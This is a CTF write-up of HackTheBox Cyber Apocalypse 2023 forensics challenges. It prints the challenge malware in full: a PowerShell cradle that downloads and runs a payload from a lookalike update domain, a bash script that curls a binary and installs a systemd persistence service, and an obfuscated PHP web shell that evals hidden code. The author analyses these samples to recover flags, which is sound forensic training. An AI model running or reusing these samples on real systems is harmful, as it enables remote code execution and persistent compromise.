---
description: The CTF was on the HackTheBox platform, held from 18 Mar - 23 Mar 2023.
---

# Cyber Apocalypse 2023 - The Cursed Mission

It featured challenges from 10 different categories like pwn, forensics, misc, reversing, crypto, hardware, blockchain, web, ML and warmup.

<figure><img src="../.gitbook/assets/image (2) (7).png" alt=""><figcaption></figcaption></figure>

I participated in the CTF with a new team: `TeamHalfDay` and new folks who are currently serving in NS. I was recently invited to their team on CTFtime where they are more commonly known as team [`youtiaos`](https://ctftime.org/team/194864)``

I am under the team members with the username: `rz--`.

<figure><img src="../.gitbook/assets/image (1) (1) (3).png" alt=""><figcaption></figcaption></figure>

For this CTF, we spent some time tackling various challenges from different categories according to our expertise and managed to obtain the rank: `256/6483.` I would consider my expertise in the forensics category, hence I attempted most challenges from that category.

<figure><img src="../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

## Sanity Check

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Similar to previous CTF competiions, there's a sanity check challenge for this event as well.

Upon joining the Discord server, we can see the flag announced in the `announcement` channel.

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Flag: HTB{l3t\_th3\_tr3asur3\_hunt1ng\_b3g1n!}

## Plaintext Tleasure

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

For this challenge, it was under the forensics category. We were given a zip file with a `.pcap` file in it.

{% file src="../.gitbook/assets/forensics_plaintext_treasure.zip" %}

This was a pretty simple and straightforward challenge.&#x20;

First, we could open the `.pcap` file in Wireshark to futher analyze the packets.

Next, if we right click on the first packet, `Follow > TCP Stream`, and increment the stream to `stream 4`, we will be able to see the flag in plaintext.

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Alternatively, an easier and faster way could be to use `strings` to search for string text in the capture file and use `grep` to find the flag format

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip forensics_plaintext_treasure.zip 
Archive:  forensics_plaintext_treasure.zip
  inflating: capture.pcap            
                                                                                                                   
┌──(kali㉿kali)-[~/Downloads]
└─$ strings capture.pcap | grep HTB
HTB{th3s3_4l13ns_st1ll_us3_HTTP}
```

Flag: HTB{th3s3\_4l13ns\_st1ll\_us3\_HTTP}

## Alien Cradle

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a zip file as well. In the zip file, we will find a `.ps1` file.

Somehow Windows flagged this script as `virus`, so I downloaded it on my Kali Linux VM instead.

If we read the contents of the Powershell script, we will find the flag

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat cradle.ps1 
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); 
```

We can use this [CyberChef recipe](https://cyberchef.org/#recipe=Find\_/\_Replace\(%7B'option':'Regex','string':'%5C''%7D,'',true,false,true,false\)Find\_/\_Replace\(%7B'option':'Simple%20string','string':'%2B'%7D,'',true,false,true,false\)Find\_/\_Replace\(%7B'option':'Regex','string':'%20'%7D,'',true,false,true,false\)\&input=aWYoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUgLW5lICdzZWNyZXRfSFFcQXJ0aCcpe2V4aXR9OyR3ID0gTmV3LU9iamVjdCBuZXQud2ViY2xpZW50OyR3LlByb3h5LkNyZWRlbnRpYWxzPVtOZXQuQ3JlZGVudGlhbENhY2hlXTo6RGVmYXVsdE5ldHdvcmtDcmVkZW50aWFsczskZCA9ICR3LkRvd25sb2FkU3RyaW5nKCdodHRwOi8vd2luZG93c2xpdmV1cGRhdGVyLmNvbS91cGRhdGVzLzMzJyArICc5NmYzYmY1YTYwNWNjNCcgKyAnMWJkMGQ2ZTIyOTE0OCcgKyAnMmE1LzJfMzQxMjIuZ3ppcC5iNjQnKTskcyA9IE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtKCxbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGQpKTskZiA9ICdIJyArICdUJyArICdCJyArICd7cDB3M3JzJyArICdoM2xsJyArICdfQ3I0ZCcgKyAnbDNzX2M0bl9nM3QnICsgJ190aCcgKyAnM19qMGJfZCcgKyAnMG4zfSc7SUVYIChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcihOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0oJHMsW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7ICAgICAgICAgICA) which finds and replace the following to get the flag:

1. Find `'` and replace
2. Find `+` string and replace
3. Find `` and replace

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Flag: HTB{p0w3rsh3ll\_Cr4dl3s\_c4n\_g3t\_th3\_j0b\_d0n3}

## Extraterrestrial Persistence

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a `.sh` file embedded in the zip file.

{% file src="../.gitbook/assets/forensics_extraterrestrial_persistence (1).zip" %}

If we extract the shell script and read its contents, we will get a rough idea of what it is doing. Basically, among the other operations, it looked like it was decoding a `Base64` encoded string.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat persistence.sh 
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service 
```

We could decode the `Base64` encoded string as such and obtain the flag under the `Unit` - `Description`.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA== | base64 -d
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target      
```

Flag: HTB{th3s3\_4l13nS\_4r3\_s00000\_b4s1c}

## Roten

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a `.cap` file embedded in the zip file.

{% file src="../.gitbook/assets/forensics_roten.zip" %}

First, lets analyze the packets in Wireshark.

If we go to the `Export HTTP objects` functionality, we would see that there are at least a hundred files transmitted.

While looking through the files, I found a file `map_update.php` with surprisingly larger file size compared to the other `map_update.php` files.

I downloaded this file and it showed the following php script which clearly looked obfuscated.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat map-update.php      
-----------------------------310973569542634246533468492466
Content-Disposition: form-data; name="uploaded_file"; filename="galacticmap.php"
Content-Type: application/x-php

<?php 
$pPziZoJiMpcu = 82; 
$liGBOKxsOGMz = array(); 
$iyzQ5h8qf6 = "" ; 
$iyzQ5h8qf6 .= "<nnyo ea\$px-aloerl0=e r\$0' weme Su rgsr s\"eu>\"e'Er= elmi)y ]_'t>bde e e  =p   xt\" ?ltps vdfic-xetrmsx'l0em0  o\"oc&'t [r\"e _e;eV.ncxm'vToil   ,F y"; 
$iyzQ5h8qf6 .= "<r s -<a  \"op r_P< poeeihaeild /ds\"se4bsxao1: r]du ;e\$'o,t dn\n)i\$'me'maoate{e  I!lb>'u btde .sr ege/ han:t"; 
$iyzQ5h8qf6 .= "elrlenjl t>( 0'eCdd0  l et0\n'seu u it ;e_ dc>ulUd'T\nxe\$L<er<.l oh>c  ii aert pdt iai(ed.QiJr\n\$i0; 0\"e0' d= ex ].xp\$r re \nwSn'u<lup ]o iluE/=>b\$t r>\n"; 
$iyzQ5h8qf6 .= "h rxn ltmb \n'-aodd') bubaa\nff0 i0] )- [ &\"4 ==e[wn (r #iEa tftelF)U sspSb\"'rd  dO o e_t ppso \n]DpneaC;aoesvp\ni( }f0 & ' \"( ]0 =sc'o  \$s #nRmaeoi=oi)p te"; 
$iyzQ5h8qf6 .= "l[>c;>ia ew   agP aw(d i;ep:rto\nnor/a/<l )\n( = ?;\$r\$0 0 'puwr\$\$d\" fgVeu'rp'al l s o'<o\n<rs rn \" leeetu\$y f\nsl (en dtyjS3?e\$   ) 0 \ngem0=  xrtrlsdi; l E=t>ma\"d"; 
$iyzQ5h8qf6 .= "e{o  iafbl\nb. }ee < ptrchid>   cia''t  s qc.p)m{ \$ (0' rao0 ) 'ieid;ir\n adR'o\\ r.''\na ifdiro >'\$\ndr<t apmh(di\" ( rctE)"; 
$iyzQ5h8qf6 .= "e mtlur3h;o  m{\$2x odd0(  )n't[\nr)  gi[dcnat\$   d n Dl>r R k}\"<tr twso\$(r; i iatx;n iriei.p\nd\$ o m0' u\"e1\$\$ "; 
$iyzQ5h8qf6 .= " t]e'} ) } r'io\"c/_in '  (ie': e&e\n>/b> hu( df)\n s ptap\nt nabrp6\n et d\$o0  p] )ogi?f)'r\n=  \n=ePrm;tfGda"; 
$iyzQ5h8qf6 .= " ]e\"mrT;r s&ye\nto\" (i\$\"ii e s tici - ipryt/\n  y etd): [ & wrf (;]e\n {   cH'p\nioE=m [c.oeo\ne u  c hd; \$dd<rl.c e iohr L fca/ jf &p  ye   "; 
$iyzQ5h8qf6 .= "\"= ?no('\"\n,a\n\$\n  HtP leorT'e 'h\$vcU d l'=h >y\n d(it.e h t onme e idr1-su  e &p ?' e 0 eu t%  d\$_   To_vecnm[f= nouetp \" t."; 
$iyzQ5h8qf6 .= ">o \n> eifrd'o\"o ( n/es n eny.-/n 0=e e& - x(0'rp\$'1 \$'dP   BrSath=-'i' a p_ol >  \$    \n cri)>/w<  \$i:on: g "; 
$iyzQ5h8qf6 .= "d. 1>bc x'l0= ''\$e\$0x[[m s g]iO   {yEleo'ddls m\"luro E}o_\$\"< < h.l <'n/\" _f ct  t  c-2\not 2dsx'0w;gcm0''\"o:% r,rS   W Lu= \"aieu\$e<opya r\nfG"; 
$iyzQ5h8qf6 .= "v<t ? o'e.a.et< G Ft;0 h Co-.<oi 0'eAs0'\nruo2 eed 1 o  T   0\"Fe'\".trTbu'bal)d r\n Eabh p  /o  \$rd/ E(ie ' :eSm>2stoi0; 0'4  otd):xxe's u\$=[ "; 
$iyzQ5h8qf6 .= "  w '=o<\$a'omp]rdo)' o}cTlre h \"'w\"hv(>t Tfltf)  xS/\n/csnf0 i0;0: uee  ee T% pw '  \$_.]\"f/_']Uil)>Da ] r\no[u>a p <.n<ra\$\\a [ie-i; 'i b<jrt ( }f0 0  "; 
$iyzQ5h8qf6 .= "p\" ?'cc&'1 [o\$d  dR ..ffS>.pto;<id{[} \nm'e\"d \n t\$e/eldnb 'l sl\n  t-osqirp )\n( })' []& -uu ;s\$'r_ii iO\$\"\$'oE"; 
$iyzQ5h8qf6 .= "\\\"l'a\nbre\n' uimc);> fidvrtfui\"l deTte  .;-ocupar\$   )\n - \"  ''tt0\n\"selGrf rtd'd rRn'o>d red nepfam \n\n<o"; 
$iyzQ5h8qf6 .= "f>a(d=er;e o_rrn h \n>tretpim{ \$  ?' w=0w;eex ,.xdE'   _i iamV\"/a\"D >c_ all nd{? tr <l\$>').\n> weaea ef \nsir .no  "; 
$iyzQ5h8qf6 .= "m{  ; r 0'\n'\"2  =e[T](\$=Armru>E;>d;i <tf mso(d'\n> he(aud\\\" ' \" nxnam ai <tpysmtd\$ o  '\n i(0  ]]0 \$sc'[;if _ e.t\"R\n '\nr boi eeai ] \n >ai ein../ ; lisme "; 
$iyzQ5h8qf6 .= "dl lrt.riPet d\$ r \$t\$0: = 0 opuw'\nsi'D.t\"o;[e\">ee  rl ' dse, \n Pcsh)r\"  ' \n osf'= ee ia mcne y et ' gem4  ==  wrtrd}_l.a h f\n'c;\\cc sye ]{isx  <"; 
$iyzQ5h8qf6 .= " eh_r .;\$\". \n ate)\" rs npsi=.r&p  y   r\"o)' ' ) nieii\nfe/Y\"o/oePh\nnht t.( .\nnee\$ t r de.'\n_'\$ \n dsr;' (i k/rn\"jm e &p : o]d - x(  en'tr\$i '}<d>ccHoe<o"; 
$iyzQ5h8qf6 .= "o y\"\$ ' gtcc a<m(if / S>v ? '('\n. 'z  3c.hss0=e e   u e?' '\$\$ rt]e'fl=;\n/=\"uhP cb ril._    (um bti\$r=\"' E\"a > ]\$) b Pe r.=jt\"(x'l0=e' p=  ; )gw\$[f)']ie \n\$h"; 
$iyzQ5h8qf6 .= "';so_\"hr\"yfe<F u f\$td lrsd('/. R.l \n )f; a r(}e3\"st>\$1csx'l- [ &'\n  ros'(;];l(\$}d2G\n> S<o><  =/I p i_ir e>sir\"'\$ V u}\n )i\n s a\$\nl.h\"p<f0'e8l"; 
$iyzQ5h8qf6 .= "s' \"( r i?or=r\"\n,\ne\$d\ni>Ee\\\"Ei </=('bL l lGoe  \nire.>v E\$e\n\n  l  ehgf}=6t>:/i0; 0'e;\$r\$0' f ulse%  i di\$r\"Tcn\\Ln\"id fc>E o eEns c osa \"a Rv) \n {e"; 
$iyzQ5h8qf6 .= "  nemi\n\"/t</sl0 i0; \noem0  ('pdpa1 \$f=irds;'h<nFp<ni\$io<S a  T:u l n l\$.l [a) < \n)  aaal\nscp//ce }f0 \$ wao0:  s[[rds w  r;i \n>o"; 
$iyzQ5h8qf6 .= "i<'uipvdll/[ d '[ l a sap_ u 'l[ /  )  md:e?tsssmr))\n( }t ndd1  \$''\"i'% o(')\nr=e\" nb]tnu>ieob' e .'<t s <saS\$e}Pu"; 
$iyzQ5h8qf6 .= "n d     ee )>ys:cai    )\ny e\"e0' m een]1 ri')   c;\"pr. pt\"r_rrfed \$c/) s / tEv)\nHea i  {  (rp)\nl//rxp{{ \$  p r] )- o:xxt,s ls;  =sh\n<u>\"tu"; 
$iyzQ5h8qf6 .= " ;.e:>ic  umb; = t\$hRa) P m v  \n  \$(u;\neb/ict\n  m{ e [ & ' d eef % ds\n{  coeit\\'ytt\n'xr<lhs pd>\n \" hk(Vl[ _.e >     f'b\n<soapd> \$ o  = \"="; 
$iyzQ5h8qf6 .= " ?;\$e'cc(\$1 [ei\n ra cn n p y\n/ie/eou l'< et >e\$Eun S ] \n     iCl hhojtn\n t d\$ ' e 0 \nw Suu\"os\$'tf  en\"hpt<metpi'sdbT c o]b ca"; 
$iyzQ5h8qf6 .= "<\nydRea E\" e<    hlai teta>.\n y et u x(0' o&'tt%w\"se(   ad\\ouyde=yef.t'ro'c a)r hbt  i[ m L<.c/    eecc mesx\nb< p  y '\$e\$0x r ;ee1n,.x\$(  lin tpit'p"; 
$iyzQ5h8qf6 .= "= bs>>U<e d)> olh =r'.e F/\"hh \$  a)h' ltt.\nod e &p ;ocm2' l0\n'\"se =e_\$  pr<\" evhhe'(a(E\"pbseD \"  e> >.P ] 'a<ot f hd.e) >\"r"; 
$iyzQ5h8qf6 .= "g<oi =e e \nwuo0  dx ]]\"r\$scPd  a(b<t= oi=sis\$r;lrsci{; \" N  'H\"  ]>/ m i ee'-; \n ao!tv 'l0=e ntd): [8 = ,[gpuOi  t\$riy'cdd'useur\no>fhr\n\n \$ta \$/P<.e <t\""; 
$iyzQ5h8qf6 .= "l l ar\"C\n <hpo-s  psx'l eee   \"0 == 'rrtSr  hd>npsl=dfbsnpo a<uoe   vam v'_/ l./d<> e d('o  !r.g-tc\$'e6-s r\" ?' e0 ' \$woieT   (i<peua'eime"; 
$iyzQ5h8qf6 .= "alr dbl c  fabe<a.Sa\"s t>/    e')n  -eml rlm; 0'e []& - x  x(trun'[=  \$rfu=bsPnlitmo. 'rl't  oll</l\$E><e\"d<t  = rC;t  -fieLaao i0;  \"  ''\$e) "; 
$iyzQ5h8qf6 .= "'\$yipt]'=  d)ot'msO'et(ea  ]>y<o  rue/tuvL</ ?>tr    (o\nr   =naapsd}f0 i w=0w;wc  )wpt[f)d   i;r ti=S ''\$(dF [< br  ee-treaF/t{d<d>  \$h"; 
$iyzQ5h8qf6 .= "'n o  L\".ptcse\n( }f r 0'\nou\$  oee'(;iN  r\nmtet'Tn  _\$Di 'biry  a hh>)l'td\not>\"  _eCt l rahcied=   )\n( i(0  rtoi?r)'r\"\nrU e.e yx'n'anvP_il t>n>.  c"; 
$iyzQ5h8qf6 .= "\\o>\n u]d> wd ;  Gaoe : ettsssn\"= \$   \$t\$4: lewf l;]e% 'L c'capt a maaOFre mF <'  hnv\n {e >< n>\"\n  Ednn   aets.t.c  m{ \$oem0  d\"n('d\n,a1 ]L h/hce'vveemlS"; 
$iyzQ5h8qf6 .= "Ie }pi'b<ee <e  \n).<t l\" }  Tett m dsp\"c cof o  mw\"o)' []e s[  ds )  o'ot= abn=euTLca\n_l.r/cx(br   ) td o..\n  [re- u ft:>oconi d\$ on]d - "; 
$iyzQ5h8qf6 .= "\" r\$'' \$'% )oe . i'nlac'=e[Etl ne\$>bhe\$r    )\"d> a  e  '(nD s i /\nmomtl et de e?' w=[m e o]1  rc\$\$\"ohaurtd'='Sor a d<>occ>t <  ?>  dppc  d"; 
$iyzQ5h8qf6 .= "'ti t lc/\n/m/ae  y er=  ; r \"o:x w,s { hfv<nime-yif's[re m'ib< (m\"a / {d\"\" =orh  oC-s -heom<apbip &p  [ &'\n i(ed e n % \n!oiah=de=fpriUu'ya e.r b\"'d;b t"; 
$iyzQ5h8qf6 .= " \ni.  \"sio  woTp re(ma!jionee e &\"( r \$t\$xe'c e\$1  i ll2'd='oe'lpbf)d '\$.sr<cr\nl h  r . .in   "; 
for($i = 0; $i < $pPziZoJiMpcu; $i++) $liGBOKxsOGMz[] = ""; 
for($i = 0; $i < (strlen($iyzQ5h8qf6) / $pPziZoJiMpcu); $i++) { for($r = 0; $r < $pPziZoJiMpcu; $r++) $liGBOKxsOGMz[$r] .= $iyzQ5h8qf6[$r + $i * $pPziZoJiMpcu]; } 
$bhrTeZXazQ = trim(implode("", $liGBOKxsOGMz)); 
$bhrTeZXazQ = "?>$bhrTeZXazQ"; 
eval( $bhrTeZXazQ ); 
?>
-----------------------------310973569542634246533468492466--
```

All we have to do is to change the last `eval` to `echo` in a text editor and run the php script. We can then simply `grep` for the flag.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ php map-update.php | grep HTB
##flag = HTB{W0w_ROt_A_DaY}
```

Flag: HTB{W0w\_ROt\_A\_DaY}

